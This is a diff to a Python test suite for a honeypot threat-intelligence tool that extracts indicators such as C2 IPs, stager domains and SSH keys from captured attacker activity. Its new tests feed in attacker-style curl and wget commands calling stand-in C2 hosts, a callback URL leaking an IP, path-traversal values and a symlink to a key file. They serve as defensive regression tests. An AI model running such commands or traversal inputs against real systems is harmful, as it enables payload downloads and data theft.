@@ -5,7 +5,6 @@ from __future__ import annotations
 import hashlib
 import os
 from datetime import UTC, date, datetime
-from pathlib import Path
 from typing import TYPE_CHECKING
 
 import polars as pl
@@ -20,6 +19,8 @@ from lantana.enrichment.ioc import (
 )
 
 if TYPE_CHECKING:
+    from pathlib import Path
+
     import pytest
 
 
@@ -143,23 +144,20 @@ class TestExtractHashesFromDisk:
         tmp_path: Path,
         monkeypatch: pytest.MonkeyPatch,
     ) -> None:
-        """If cowrie deletes a file between iterdir() and read_bytes(),
+        """If cowrie deletes a file between scandir() and O_NOFOLLOW open(),
         treat as a benign race and continue.
         """
+        from lantana.enrichment import ioc as ioc_mod
+
         sensor_dir = tmp_path / "sensor"
         (sensor_dir / "cowrie" / "downloads").mkdir(parents=True)
         (sensor_dir / "cowrie" / "downloads" / "missing.bin").write_bytes(b"data")
 
-        original_read_bytes = Path.read_bytes
+        def _vanishing_hash(*_args: object, **_kwargs: object) -> None:
+            raise FileNotFoundError("missing.bin")
 
-        def _vanishing_read(self: Path) -> bytes:
-            raise FileNotFoundError(self)
-
-        monkeypatch.setattr(Path, "read_bytes", _vanishing_read)
-        try:
-            result = extract_hashes_from_disk(sensor_dir)
-        finally:
-            monkeypatch.setattr(Path, "read_bytes", original_read_bytes)
+        monkeypatch.setattr(ioc_mod, "_hash_regular_file_at", _vanishing_hash)
+        result = extract_hashes_from_disk(sensor_dir)
 
         assert result == set()
 
@@ -433,3 +431,123 @@ class TestV15DurableExtractors:
             exclude_hashes=hashes,
         )
         assert [ev["binary_file_name"] for ev in fallback] == ["unattributed_only"]
+
+
+class TestSecurityHardeningIocExtraction:
+    """Adversarial regression tests for URL parsing, OPSEC leaks, ReDoS, and path traversal."""
+
+    def test_ipv6_and_malformed_bracket_urls_never_crash_extractor(self) -> None:
+        from lantana.enrichment.ioc import (
+            extract_outbound_c2_ips,
+            extract_outbound_urls,
+            extract_stager_domains,
+        )
+
+        cfg = _config()
+        df = pl.DataFrame(
+            {
+                "actor_process_cmd_line": [
+                    "curl http://[2001:db8:beef::1]:8080/stage.sh",
+                    "wget http://[malformed_bracket/x",
+                    "curl https://[2001:db8:205:200::8382]/own-v6",
+                ]
+            }
+        )
+        urls = extract_outbound_urls(df, cfg)
+        assert "http://[2001:db8:beef::1]:8080/stage.sh" in urls
+        assert all("malformed_bracket" not in u for u in urls)
+        assert extract_stager_domains(urls | {"http://[bad"}, cfg) == set()
+        assert "2001:db8:beef::1" in extract_outbound_c2_ips(df, cfg)
+
+    def test_outbound_url_leaking_infra_ip_or_hostname_in_query_is_rejected(self) -> None:
+        from lantana.enrichment.ioc import extract_outbound_urls
+
+        cfg = RedactionConfig(
+            infrastructure_ips=["192.0.2.10"],
+            infrastructure_cidrs=["10.50.99.0/24"],
+            infrastructure_hostnames=["vps-own.example.net"],
+        )
+        df = pl.DataFrame(
+            {
+                "actor_process_cmd_line": [
+                    "curl http://c2.example.org/cb?ip=192.0.2.10&tag=1",
+                    "curl http://c2.example.org/cb?h=VPS-OWN.EXAMPLE.NET",
+                    "curl http://c2.example.org/cb?enc=%31%39%32%2e%30%2e%32%2e%31%30",
+                    "curl http://c2.example.org/clean.sh",
+                ]
+            }
+        )
+        urls = extract_outbound_urls(df, cfg)
+        assert urls == {"http://c2.example.org/clean.sh"}
+
+    def test_extract_stager_domains_rejects_path_injection_and_non_ldh(self) -> None:
+        from lantana.enrichment.ioc import extract_stager_domains
+
+        cfg = _config()
+        domains = extract_stager_domains(
+            {
+                "http://evil.example.org%2f..%2ffiles%2fdeadbeef/x",
+                "http://bad_underscore.example.org/x",
+                "https://valid-drop.example.org/payload",
+            },
+            cfg,
+        )
+        assert domains == {"valid-drop.example.org"}
+
+    def test_outbound_c2_extractor_linear_time_no_redos(self) -> None:
+        import time
+
+        from lantana.enrichment.ioc import extract_outbound_c2_ips
+
+        cfg = _config()
+        adversarial = "wget " * 10_000 + "http://not-an-ip/x"
+        df = pl.DataFrame({"actor_process_cmd_line": [adversarial]})
+        t0 = time.monotonic()
+        assert extract_outbound_c2_ips(df, cfg) == set()
+        assert (time.monotonic() - t0) < 0.5
+
+    def test_extract_ssh_public_keys_blocks_path_traversal_and_symlinks(
+        self, tmp_path: Path
+    ) -> None:
+        import base64
+
+        from lantana.enrichment.ioc import extract_ssh_public_keys
+
+        sensor_dir = tmp_path / "sensor"
+        dl_dir = sensor_dir / "cowrie" / "downloads"
+        dl_dir.mkdir(parents=True)
+        outside = tmp_path / "secret_key.pub"
+        raw_key = b"\x00\x00\x00\x0bssh-ed25519\x00\x00\x00 " + b"\x77" * 32
+        b64_blob = base64.b64encode(raw_key).decode("ascii")
+        outside.write_text(f"ssh-ed25519 {b64_blob} secret@host\n", encoding="utf-8")
+
+        sha_symlink = "a" * 64
+        (dl_dir / sha_symlink).symlink_to(outside)
+
+        df = pl.DataFrame(
+            {
+                "file_intent": ["persistence", "persistence", "persistence"],
+                "file_hash_sha256": [
+                    str(outside),
+                    "../../../secret_key.pub",
+                    sha_symlink,
+                ],
+            }
+        )
+        assert extract_ssh_public_keys(df, sensor_dir=sensor_dir) == set()
+
+    def test_filter_internal_ips_unwraps_ipv4_mapped_ipv6(self) -> None:
+        cfg = RedactionConfig(
+            infrastructure_ips=["192.0.2.10"],
+            infrastructure_cidrs=["10.50.99.0/24"],
+        )
+        kept = filter_internal_ips(
+            {
+                "::ffff:192.0.2.10",
+                "::FFFF:127.0.0.1",
+                "::ffff:10.50.99.100",
+                "198.51.100.55",
+            },
+            cfg,
+        )
+        assert kept == {"198.51.100.55"}
